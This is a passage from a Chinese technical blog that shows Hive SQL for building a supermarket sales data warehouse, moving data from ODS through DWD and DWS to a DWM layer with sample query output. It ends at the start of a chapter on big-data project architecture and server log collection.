class="string">&#x27;类别名&#x27;</span>,</span><br><span class="line">supplier_phone string comment <span class="string">&#x27;供应商手机号&#x27;</span>,</span><br><span class="line">supplier_address string comment <span class="string">&#x27;供应商地址&#x27;</span>,</span><br><span class="line">product_price string comment <span class="string">&#x27;商品价格&#x27;</span>,</span><br><span class="line">product_desc string comment <span class="string">&#x27;商品说明&#x27;</span>,</span><br><span class="line">effective_date string comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">expriry_date string comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">product_name string comment <span class="string">&#x27;商品名称&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;商品维度表&#x27;</span></span><br><span class="line">partitioned <span class="keyword">by</span>(dt string)</span><br><span class="line"><span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建日期维度表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> dw_dim_date_info;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dw_dim_date_info( </span><br><span class="line">date_id string comment <span class="string">&#x27;日期id&#x27;</span>,</span><br><span class="line">year_value string comment <span class="string">&#x27;年&#x27;</span>, </span><br><span class="line">month_value string comment<span class="string">&#x27;月&#x27;</span>,</span><br><span class="line">day_value string comment <span class="string">&#x27;日&#x27;</span>,</span><br><span class="line">date_value string comment <span class="string">&#x27;年-月-日&#x27;</span>,</span><br><span class="line">is_weekend string comment <span class="string">&#x27;是否周末&#x27;</span>, <span class="comment">-- 0表示非周末，1表示周末</span></span><br><span class="line">day_of_week string comment <span class="string">&#x27;一周中的周几&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;日期维度表&#x27;</span></span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (dt string)</span><br><span class="line"><span class="type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建销售事实表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> dwd_sale_fact;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dwd_sale_fact( </span><br><span class="line">order_id string comment <span class="string">&#x27;清单号&#x27;</span>,</span><br><span class="line">order_status string comment <span class="string">&#x27;清单状态&#x27;</span>, </span><br><span class="line">market_id string comment<span class="string">&#x27; 超市分店编号&#x27;</span>,</span><br><span class="line">date_id string comment <span class="string">&#x27;日期id&#x27;</span>,</span><br><span class="line">product_num <span class="type">int</span> comment <span class="string">&#x27;商品数量&#x27;</span>,</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">create_time string comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time string comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;销售事实表&#x27;</span></span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (dt string)</span><br><span class="line"><span class="type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看到新建成功的表</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line">OK</span><br><span class="line">course</span><br><span class="line">dw_dim_date_info</span><br><span class="line">dw_dim_market_info</span><br><span class="line">dw_dim_product_info</span><br><span class="line">dwd_sale_fact</span><br><span class="line">ods_market_info</span><br><span class="line">ods_product_info</span><br><span class="line">ods_sale_info</span><br><span class="line">stu</span><br><span class="line">stu1</span><br><span class="line">tmp_ods_to_dwd_sale_info</span><br></pre></td></tr></table></figure>

<h4 id="导入ODS层数据"><a href="#导入ODS层数据" class="headerlink" title="导入ODS层数据"></a>导入ODS层数据</h4><ul>
<li>把数据接入层（ODS）导入到维度表中</li>
</ul>
<h5 id="日期维度表"><a href="#日期维度表" class="headerlink" title="日期维度表"></a>日期维度表</h5><ul>
<li>初始化一些测试数据，注意date_value这个字段的值，需要和<code>tmp_ods_to_dwd_sale_info</code>中的<code>create_time</code>有关联关系，要造一些相等条件的数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">su hadoop</span><br><span class="line">hive</span><br><span class="line">hive<span class="operator">&gt;</span>use hive;</span><br><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dw_dim_date_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;2021122101&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;2021-12-15&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;51&#x27;</span>);</span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dw_dim_date_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;2021122102&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;2021-12-24&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;51&#x27;</span>);</span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dw_dim_date_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;2021122103&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;2021-12-25&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;51&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dw_dim_date_info;</span><br><span class="line">OK</span><br><span class="line"><span class="number">2021122101</span>      <span class="number">2021</span>    <span class="number">12</span>      <span class="number">15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">0</span>       <span class="number">51</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">2021122102</span>      <span class="number">2021</span>    <span class="number">12</span>      <span class="number">24</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-24</span>      <span class="number">0</span>       <span class="number">51</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">2021122103</span>      <span class="number">2021</span>    <span class="number">12</span>      <span class="number">25</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-25</span>      <span class="number">1</span>       <span class="number">51</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="超市维度表"><a href="#超市维度表" class="headerlink" title="超市维度表"></a>超市维度表</h5><ul>
<li>ods_market_info 表数据插入</li>
<li><strong>此次实例中，好像没有用到</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dw_dim_market_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">select</span> market_id,market_address,market_name,start_time <span class="keyword">as</span> effective_date,end_time <span class="keyword">as</span> expiry_date</span><br><span class="line"><span class="keyword">from</span> ods_market_info;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dw_dim_market_info;</span><br><span class="line">OK</span><br><span class="line"><span class="number">1000001</span> 湖南省长沙市开福区万达广场<span class="number">1021</span>号        大润发开福万达店        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2028</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">1000002</span> 湖南省长沙市岳麓区万达广场<span class="number">1021</span>号        大润发岳麓万达店        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2028</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">1000003</span> 湖南省长沙市雨花区万达广场<span class="number">1021</span>号        大润发雨花万达店        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2028</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br></pre></td></tr></table></figure>

<h5 id="商品维度表"><a href="#商品维度表" class="headerlink" title="商品维度表"></a>商品维度表</h5><ul>
<li>ods_product_info表数据插入</li>
<li><strong>此次实例中，好像没有用到</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dw_dim_product_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">select</span> product_id,product_name,type_name,supplier_phone,supplier_address,product_price,product_desc,start_time <span class="keyword">as</span> effective_date,end_time <span class="keyword">as</span> expiry_date</span><br><span class="line"><span class="keyword">from</span> ods_product_info;</span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dw_dim_product_info;</span><br><span class="line">OK</span><br><span class="line"><span class="number">221</span>     商品名称<span class="number">78</span>ABC   食品    <span class="number">18576759590</span>     湖南省常德市    <span class="number">50</span>      产品描述        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2022</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">545</span>     商品名称XYyzA   食品    <span class="number">18576759590</span>     湖南省常德市    <span class="number">50</span>      产品描述        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2022</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">639</span>     商品名称GHdef   食品    <span class="number">18576759590</span>     湖南省常德市    <span class="number">50</span>      产品描述        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2022</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">459</span>     商品名称cdtuv   食品    <span class="number">18576759590</span>     湖南省常德市    <span class="number">50</span>      产品描述        <span class="number">2021</span><span class="number">-12</span><span class="number">-16</span>      <span class="number">2022</span><span class="number">-12</span><span class="number">-17</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="销售事实表"><a href="#销售事实表" class="headerlink" title="销售事实表"></a>销售事实表</h5><ul>
<li><code>tmp_ods_to_dwd_sale_info</code>表是上述处理重复销售清单记录表的过滤后的临时表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dwd_sale_fact <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>) <span class="keyword">select</span> a.order_id,a.order_status,a.market_id,b.date_id,a.product_num,a.product_id,a.create_time,a.update_time</span><br><span class="line"><span class="keyword">from</span> tmp_ods_to_dwd_sale_info a</span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span> dw_dim_date_info b</span><br><span class="line"><span class="keyword">on</span> a.create_time<span class="operator">=</span>b.date_value;</span><br><span class="line"></span><br><span class="line">#  查询到<span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>的关联数据</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dwd_sale_fact;</span><br><span class="line">OK</span><br><span class="line"><span class="number">11</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">12</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">14</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">16</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">17</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">20</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">5</span>       <span class="number">221</span>     <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<h2 id="数据汇总层DWS"><a href="#数据汇总层DWS" class="headerlink" title="数据汇总层DWS"></a>数据汇总层DWS</h2><ul>
<li>由于我们要统计商品A的销售量，以及商品A的购买比例，因此在数据汇总层，对销售数据按照清单号进行汇总，并添加include_product_a 字段，用于表示该清单是否商品A（本实例中的商品id为221），处理过程如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建DWS层清单记录表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> dws_order_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dws_order_info (</span><br><span class="line">order_id string comment <span class="string">&#x27;清单号&#x27;</span>,</span><br><span class="line">order_status string comment <span class="string">&#x27;清单状态&#x27;</span>, </span><br><span class="line">market_id string comment<span class="string">&#x27; 超市分店编号&#x27;</span>,</span><br><span class="line">include_product_a <span class="type">int</span> comment <span class="string">&#x27;是否包括商品A&#x27;</span>,</span><br><span class="line">date_id string comment <span class="string">&#x27;日期id&#x27;</span>,</span><br><span class="line">a_num <span class="type">int</span> comment <span class="string">&#x27;商品A数量&#x27;</span>,</span><br><span class="line">product_info string comment <span class="string">&#x27;商品信息&#x27;</span>,</span><br><span class="line">create_time string comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time string comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;清单记录表&#x27;</span></span><br><span class="line">PARTITIONED <span class="keyword">BY</span> (dt string)</span><br><span class="line"><span class="type">ROW</span> FORMAT DELIMITED FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建中间表，添加is_product_a字段</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> tmp_dwd_to_dws_order_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tmp_dwd_to_dws_order_info <span class="keyword">as</span> <span class="keyword">select</span> </span><br><span class="line">order_id,order_status,market_id,date_id,</span><br><span class="line"><span class="keyword">Case</span> </span><br><span class="line"><span class="keyword">when</span> product_id<span class="operator">=</span><span class="number">221</span> <span class="keyword">then</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">as</span> is_product_a, <span class="comment">-- 是否为商品A</span></span><br><span class="line"><span class="keyword">case</span> </span><br><span class="line"><span class="keyword">when</span> product_id<span class="operator">=</span><span class="number">221</span> <span class="keyword">then</span> product_num</span><br><span class="line"><span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">as</span> a_num, <span class="comment">-- 商品A的数量</span></span><br><span class="line">product_id,</span><br><span class="line">product_num,</span><br><span class="line">create_time,</span><br><span class="line">update_time</span><br><span class="line"><span class="keyword">from</span> dwd_sale_fact;</span><br><span class="line"></span><br><span class="line"># 查询到以及过滤的product_id为<span class="number">221</span>的清单数据</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tmp_dwd_to_dws_order_info;</span><br><span class="line">OK</span><br><span class="line"><span class="number">11</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">12</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">14</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">16</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">17</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">20</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">22</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">23</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">24</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"><span class="number">25</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>     <span class="number">5</span>       <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 按照清单号进行清单数据汇总</span></span><br><span class="line">hive<span class="operator">&gt;</span><span class="keyword">insert</span> <span class="keyword">into</span> dws_order_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> order_id,order_status,market_id,date_id,</span><br><span class="line"><span class="keyword">case</span></span><br><span class="line"><span class="keyword">when</span> <span class="built_in">sum</span>(is_product_a)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">then</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">as</span> include_product_a,</span><br><span class="line"><span class="built_in">sum</span>(a_num) <span class="keyword">as</span> a_num,</span><br><span class="line">concat_ws(<span class="string">&#x27;_&#x27;</span>,collect_list(<span class="built_in">cast</span>(product_id <span class="keyword">as</span> string)),collect_list(<span class="built_in">cast</span>(product_num <span class="keyword">as</span> string))) <span class="keyword">as</span> product_info,</span><br><span class="line">create_time,update_time</span><br><span class="line"><span class="keyword">from</span> tmp_dwd_to_dws_order_info <span class="keyword">group</span> <span class="keyword">by</span> order_id,order_status,market_id,date_id,create_time,update_time;</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dws_order_info;</span><br><span class="line">OK</span><br><span class="line"><span class="number">11</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">12</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">14</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">16</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">17</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"><span class="number">20</span>      待付款  <span class="number">1000001</span> <span class="number">2021122101</span>      <span class="number">1</span>       <span class="number">5</span>       <span class="number">221</span>_5   <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-15</span>      <span class="number">2021</span><span class="number">-12</span><span class="number">-21</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>参考<a href="https://blog.csdn.net/ygdlx521/article/details/71156354">Hive中case when的两种语法</a></li>
<li>参考<a href="https://blog.csdn.net/weixin_37536446/article/details/80597480">hive中对多行进行合</a></li>
<li>发现个奇怪问题，<strong>插入的字段居然要和表中的顺序一致，不然为空</strong>，比如<code>product_info</code>就有这样的问题</li>
</ul>
<h2 id="数据集市层DWM"><a href="#数据集市层DWM" class="headerlink" title="数据集市层DWM"></a>数据集市层DWM</h2><ul>
<li>在数据集市层，需要对相关指标进行聚合计算，处理过程如下。</li>
<li><strong>此处商品A的id为221</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> dwn_order_info_by_day;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dwn_order_info_by_day</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span></span><br><span class="line"><span class="built_in">count</span>(<span class="keyword">distinct</span> c.order_id) <span class="keyword">as</span> consumption_num, <span class="comment">-- 商品A销售清单</span></span><br><span class="line"><span class="built_in">sum</span>(c.a_num) <span class="keyword">as</span> day_num, <span class="comment">-- 商品A消费总数</span></span><br><span class="line"><span class="built_in">sum</span>(c.include_product_a)<span class="operator">/</span><span class="built_in">count</span>(<span class="keyword">distinct</span> c.order_id) <span class="keyword">as</span> buy_a_rate <span class="comment">-- 购买商品A的消费比例</span></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">a.order_id <span class="keyword">as</span> order_id,</span><br><span class="line">a.a_num <span class="keyword">as</span> a_num,</span><br><span class="line">a.include_product_a <span class="keyword">as</span> include_product_a,</span><br><span class="line">b.year_value <span class="keyword">as</span> year_value,</span><br><span class="line">b.month_value <span class="keyword">as</span> month_value,</span><br><span class="line">b.day_value <span class="keyword">as</span> day_value </span><br><span class="line"><span class="keyword">from</span> dws_order_info a </span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> dw_dim_date_info b <span class="keyword">on</span> a.date_id<span class="operator">=</span>b.date_id) c </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> c.day_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询到商品A的购买数据记录</span></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dwn_order_info_by_day;</span><br><span class="line">OK</span><br><span class="line"><span class="number">62</span>      <span class="number">310</span>     <span class="number">2.021122101E9</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.098</span> seconds, Fetched: <span class="number">1</span> <span class="type">row</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>以上就是数据从数据源经过ETL处理最终加载到数据仓库的整个过程。在实际业务过程中，数据规模庞大、业务逻辑复杂，需要生成大量的ETL处理任务，因此在数据仓库设计过程中，需要考虑中间层数据的通用性。在调度系统（如Airflow、Azkaban等）的调度下，这些ETL任务分批有序执行，最终生成报表等应用所需的数据</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Hadoop</tag>
        <tag>hive</tag>
        <tag>datax</tag>
      </tags>
  </entry>
  <entry>
    <title>第六章 大数据项目开发流程</title>
    <url>/aposts/f5236b59/</url>
    <content><![CDATA[<h2 id="大数据项目开发概览"><a href="#大数据项目开发概览" class="headerlink" title="大数据项目开发概览"></a>大数据项目开发概览</h2><p>一个完整的大数据项目架构可以分为数据采集层、数据存储层、数据计算层、数据接入层、数据应用层和基础服务层，如下图所示：</p>
<p><img src="/aposts/f5236b59/image-20211229113510858.png" alt="image-20211229113510858"></p>
<h2 id="数据的采集和存储"><a href="#数据的采集和存储" class="headerlink" title="数据的采集和存储"></a>数据的采集和存储</h2><p>数据采集方式主要有：</p>
<ul>
<li><p>网络数据采集</p>
</li>
<li><p>服务端日志采集</p>
</li>
<li><p>客户端日志采集</p>
</li>
</ul>
<h2 id="服务端日志采集"><a href="#服务端日志采集" class="headerlink" title="服务端日志采集"></a>服务端日志采集</h2><ul>
<li>服务端日志是重要的数据来源,它可以支持业务问题排查、业务数据分析等。下图是常见的服务端日志架构。客户端通过API( Application Programming Interface,应用程序编程接口)向服务端发送请求,服务端会在服务器本地记录日志文件。日志文件可能包括访问日志、Lnux系统日志和业务日志等。这些日志会被服务端日志采集服务收集、同步发给日志服务器,以便后续使用。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229150453592.png" alt="image-20211229150453592"></p>
<p>一个完整的服务端日志采集流程如图4-3所示。</p>
<ul>
<li><p>在客户端向服务端发送请求后，服务端会在服务器本地记录请求日志或业务日志。此外，服务端会通过服务直接向Kafka推送日志。</p>
</li>
